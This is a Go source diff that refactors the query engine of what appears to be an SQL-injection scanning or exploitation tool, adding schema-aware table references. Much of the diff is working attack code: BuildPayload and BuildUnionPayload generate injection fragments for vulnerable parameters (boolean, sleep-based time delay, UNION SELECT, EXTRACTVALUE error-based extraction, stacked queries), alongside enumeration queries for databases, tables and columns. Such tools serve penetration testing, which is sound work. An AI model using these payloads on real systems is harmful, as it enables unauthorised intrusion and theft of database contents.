@@ -48,20 +48,24 @@ func (q *QueryEngine) ListDBs() string {
 	return q.Dialect.Databases()
 }
 
-func (q *QueryEngine) ListTables(db string) string {
-	return q.Dialect.Tables(db)
+func (q *QueryEngine) ListSchemas(db string) string {
+	return q.Dialect.Schemas(db)
 }
 
-func (q *QueryEngine) ListColumns(db, table string) string {
-	return q.Dialect.Columns(db, table)
+func (q *QueryEngine) ListTables(db, schema string) string {
+	return q.Dialect.Tables(db, schema)
 }
 
-func (q *QueryEngine) TableColumns(db, table string) string {
-	return q.Dialect.TableColumns(db, table)
+func (q *QueryEngine) ListColumns(db, schema, table string) string {
+	return q.Dialect.Columns(db, schema, table)
 }
 
-func (q *QueryEngine) RowCount(db, table string) string {
-	return q.Dialect.RowCount(db, table)
+func (q *QueryEngine) TableColumns(db, schema, table string) string {
+	return q.Dialect.TableColumns(db, schema, table)
+}
+
+func (q *QueryEngine) RowCount(ref TableRef) string {
+	return q.Dialect.RowCount(ref, "")
 }
 
 func (q *QueryEngine) SearchTables(keyword string) string {
@@ -72,24 +76,27 @@ func (q *QueryEngine) SearchColumns(keyword string) string {
 	return q.Dialect.SearchColumns(keyword)
 }
 
-func (q *QueryEngine) SearchData(db, table, whereExpr string) string {
-	return fmt.Sprintf("(SELECT %s FROM %s WHERE %s)", q.ColumnsSelect(db, table), quoteTable(db, table, q.Dialect), whereExpr)
+func (q *QueryEngine) SearchData(ref TableRef, whereExpr string) string {
+	return fmt.Sprintf("(SELECT %s FROM %s WHERE %s)", q.Dialect.AllColumns(), quoteRef(ref, q.Dialect), whereExpr)
 }
 
-func (q *QueryEngine) ColumnsSelect(db, table string) string {
-	return fmt.Sprintf("%s", q.Dialect.AllColumns())
+func (q *QueryEngine) AllTables() string {
+	return q.Dialect.AllTables()
 }
 
-func (q *QueryEngine) CountAllRows(db, table string) string {
-	return q.Dialect.RowCount(db, table)
+func (q *QueryEngine) AllColumns() string {
+	return q.Dialect.AllColumns()
 }
 
-func quoteTable(db, table string, d *Dialect) string {
-	return fmt.Sprintf("%s.%s", d.Quote(db), d.Quote(table))
+// quoteRef renders a table reference using the dialect's own qualification
+// rules, so callers outside this package do not need to know them.
+func quoteRef(ref TableRef, d *Dialect) string {
+	exec := &Executor{Dialect: d}
+	return exec.tableFor(ref)
 }
 
 // BuildPayload creates a payload fragment that can be appended to a
-// vulnerable parameter value. It handles the common patterns needed by
+// vulnerable parameter value. It handles the common patterns needed by the
 // scanners: boolean, union, error, time, stacked.
 func (q *QueryEngine) BuildPayload(mode string, details string) string {
 	switch mode {
@@ -100,7 +107,7 @@ func (q *QueryEngine) BuildPayload(mode string, details string) string {
 	case "time_delay":
 		return fmt.Sprintf(" AND %s--", q.Dialect.SleepExpr(5))
 	case "union_select":
-		return fmt.Sprintf(" UNION SELECT NULL,%s,NULL FROM %s--", details, quoteTable("current", "current", q.Dialect))
+		return fmt.Sprintf(" UNION SELECT NULL,%s,NULL--", details)
 	case "error_extract":
 		errExpr, ok := q.Dialect.ErrorExpr(details)
 		if ok {
@@ -108,7 +115,7 @@ func (q *QueryEngine) BuildPayload(mode string, details string) string {
 		}
 		return fmt.Sprintf(" AND EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))--", details)
 	case "stacked_select":
-		return fmt.Sprintf("; SELECT %s FROM %s--", details, quoteTable("current", "current", q.Dialect))
+		return fmt.Sprintf("; SELECT %s--", details)
 	default:
 		return fmt.Sprintf("'%s", details)
 	}
@@ -123,10 +130,10 @@ func (q *QueryEngine) BuildUnionPayload(columns int, expression string) string {
 	for i := range nulls {
 		nulls[i] = "NULL"
 	}
-	if expression != "" {
+	if expression != "" && columns > 0 {
 		nulls[0] = expression
 	}
-	return fmt.Sprintf(" UNION SELECT %s FROM %s--", strings.Join(nulls, ","), quoteTable("current", "current", q.Dialect))
+	return fmt.Sprintf(" UNION SELECT %s--", strings.Join(nulls, ","))
 }
 
 func (q *QueryEngine) ExtractExpression(query string) string {
